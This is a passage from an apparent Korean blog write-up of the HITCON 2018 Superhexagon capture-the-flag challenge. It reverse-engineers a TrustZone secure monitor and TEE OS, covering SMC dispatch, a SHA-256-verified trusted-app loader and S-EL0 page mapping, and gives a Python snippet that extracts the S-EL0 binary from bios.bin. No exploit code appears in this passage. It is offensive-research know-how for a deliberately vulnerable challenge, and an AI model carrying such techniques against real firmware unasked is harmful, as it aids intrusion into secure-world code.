</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">software_smc</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Bad instruction - Truncating control flow here */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">halt_baddata</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>다시 VBAR을 정상적으로 세팅해준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401754</span> <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">01</span>  ee    mcr        p15,<span style="color:#ae81ff">0x0</span> ,r0,cr1 ,cr0 ,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401758</span> <span style="color:#ae81ff">58</span>  d0  <span style="color:#ae81ff">9f</span>  e5    ldr        sp,[DAT_0e4017b8 ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">08087000</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e40175</span>c <span style="color:#ae81ff">3f</span>  fa  ff  fa    blx        FUN_0e400060                                     undefined <span style="color:#a6e22e">FUN_0e400060</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401760</span> <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  f1    cps        <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401764</span> <span style="color:#ae81ff">50</span>  d0  <span style="color:#ae81ff">9f</span>  e5    ldr        sp,[DAT_0e4017bc ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">08085000</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0e401768</span> <span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">9f</span>  e5    ldr        r0,[DAT_0e4017c0 ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000000</span>h
</span></span></code></pre></div><p>thumb로 모드를 변경한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>        <span style="color:#ae81ff">08001780</span> <span style="color:#ae81ff">3</span>c  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">9f</span>  e5    ldr        r1,[DAT_080017c4 ]                               <span style="color:#f92672">=</span> <span style="color:#ae81ff">08000000</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001784</span> <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  e3    movw       r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001788</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">48</span>  e3    movt       r0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x8300</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800178</span>c <span style="color:#ae81ff">70</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">60</span>  e1    smc        <span style="color:#ae81ff">0x0</span>
</span></span></code></pre></div><p>그리고 다시 smc를 불러서 secure monitor로 돌아간다.
의사코드만 읽다가 위 어셈블리 스니펫을 놓쳤었는데, 이거 때문에 하루종일 삽질했다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/1755d65849477888fa44cd2fd30caeb7.png" alt=""  />

다시 secure monitor로 돌아가면 r1을 저장하며, TEE OS initialized 문구를 출력한다
EL0에서 TA_Bin을 secure world로 업로드했었는데, 거기를 처리하는 로직을 찾아야한다.
secure monitor 분석 결과를 기반으로 처리 로직은 vector_table + 0x20 를 따라가면 나온다는 것을알고 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_0800087c</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined4 local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span>(DAT_08085000) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000003</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000724</span>(DAT_08085004,uRam08085008);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000004</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000790</span>(DAT_08085004,uRam08085008);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000005</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080007ea</span>(DAT_08085004,uRam08085008);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x83000006</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800083e</span>(DAT_08085004);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">secure_monitor_call</span>(<span style="color:#ae81ff">0x83000007</span>,local_c);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>entry 부터 쭉 따라가다 보면 바로 원하는 로직을 발견할 수 있다.
여기서 업로드 로직을 확인해야 secure world에서 동작하는 user binary가 어떻게 동작하는지 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_08000c38</span>(<span style="color:#66d9ef">int</span> param_1,undefined4 param_2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar5;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000bb0</span>(param_1,param_2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    iVar4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>    iVar5 <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1U</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800042e</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>),iVar5,<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((((iVar1 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>         ((iVar1 <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1U</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>          (iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800042e</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),iVar1,<span style="color:#ae81ff">0xe</span>), iVar2 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        ((iVar2 <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1U</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>         (iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800042e</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>),iVar2,<span style="color:#ae81ff">0xe</span>), iVar3 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)))) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>       (iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0800042e</span>(<span style="color:#ae81ff">0xff8000</span>,<span style="color:#ae81ff">0x8000</span>,<span style="color:#ae81ff">0xe</span>), iVar3 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>),<span style="color:#ae81ff">0</span>,iVar5);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_08001906</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>),param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>,<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),<span style="color:#ae81ff">0</span>,iVar1);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001906</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>),param_1 <span style="color:#f92672">+</span> iVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>,
</span></span><span style="display:flex;"><span>                     <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>));
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>),<span style="color:#ae81ff">0</span>,iVar2);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#ae81ff">0xff8000</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x8000</span>);
</span></span><span style="display:flex;"><span>      uRam08085048 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>      iRam0808504c <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>위는 커스텀 로더의 구현이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_08000bb0</span>(undefined4 param_1,undefined4 param_2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined auStack_a0 [<span style="color:#ae81ff">112</span>];
</span></span><span style="display:flex;"><span>  undefined auStack_30 [<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>  undefined4 local_10;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x800304c</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_080011a2</span>(auStack_a0);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_08001228</span>(auStack_a0,param_1,param_2);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_08001296</span>(auStack_a0,auStack_30);
</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080018b4</span>(auStack_30,local_10,<span style="color:#ae81ff">0x20</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> local_c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>검증 로직으로 보인다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_080018b4</span>(byte <span style="color:#f92672">*</span>param_1,byte <span style="color:#f92672">*</span>param_2,<span style="color:#66d9ef">int</span> param_3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  byte bVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_24;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>local_10;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_24 <span style="color:#f92672">=</span> param_3;
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> param_1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_24 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>local_c;
</span></span><span style="display:flex;"><span>    bVar2 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>local_10;
</span></span><span style="display:flex;"><span>    local_24 <span style="color:#f92672">=</span> local_24 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> local_10 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> local_c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (bVar1 <span style="color:#f92672">==</span> bVar2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (uint)bVar1 <span style="color:#f92672">-</span> (uint)bVar2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>0x20 만큼 비교를 수행하는 것으로 보인다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_080011a2</span>(<span style="color:#66d9ef">int</span> param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x48</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4c</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x50</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6a09e667</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x54</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xbb67ae85</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x58</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c6ef372</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5c</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa54ff53a</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x60</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x510e527f</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">100</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9b05688c</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1f83d9ab</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x6c</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5be0cd19</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>sha256으로 검증한다.</p>
<p>FUN_0800042e는 S-EL0를 위한 메모리를 매핑하는 것으로 보인다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_0800042e</span>(<span style="color:#66d9ef">int</span> addr,<span style="color:#66d9ef">int</span> sz,undefined4 c10)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_18;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_14;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> sz;
</span></span><span style="display:flex;"><span>  local_14 <span style="color:#f92672">=</span> addr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_08000684</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">||</span> (iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080001e8</span>(local_14,iVar1,c10), iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    local_14 <span style="color:#f92672">=</span> local_14 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    local_18 <span style="color:#f92672">=</span> local_18 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>뭔가 normalized size를 넘기고 address로 추정되는 값을 넘기고 있다.
FUN_080001e8 내부적으로 page table을 수정해서 VA, PA를 매핑하고 있다.
AArch32긴 한데 하위 2비트가 11인 것으로 보아 AArch64 처럼 주소 변환이 동작하는 것으로 보인다.
세 번째 인자는 페이지에 대한 속성으로 보인다.</p>
<h3 id="reversing-the-binary-loader--s-el0-binary-extraction">Reversing the binary loader &amp; S-EL0 binary extraction<a hidden class="anchor" aria-hidden="true" href="#reversing-the-binary-loader--s-el0-binary-extraction">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./bios.bin&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0x00bdf10</span>)
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x750</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./SEL0.bin&#39;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(buf[<span style="color:#ae81ff">0x24</span>:]) <span style="color:#75715e"># mapping start</span>
</span></span><span style="display:flex;"><span>ext32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>,x)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>size0 <span style="color:#f92672">=</span> ext32(buf[<span style="color:#ae81ff">0x10</span>:<span style="color:#ae81ff">0x14</span>])
</span></span><span style="display:flex;"><span>addr0 <span style="color:#f92672">=</span> ext32(buf[<span style="color:#ae81ff">0xc</span>:<span style="color:#ae81ff">0x10</span>])
</span></span><span style="display:flex;"><span>print(hex(addr0), hex(size0))
</span></span><span style="display:flex;"><span>size1 <span style="color:#f92672">=</span> ext32(buf[<span style="color:#ae81ff">0x18</span>:<span style="color:#ae81ff">0x1c</span>])
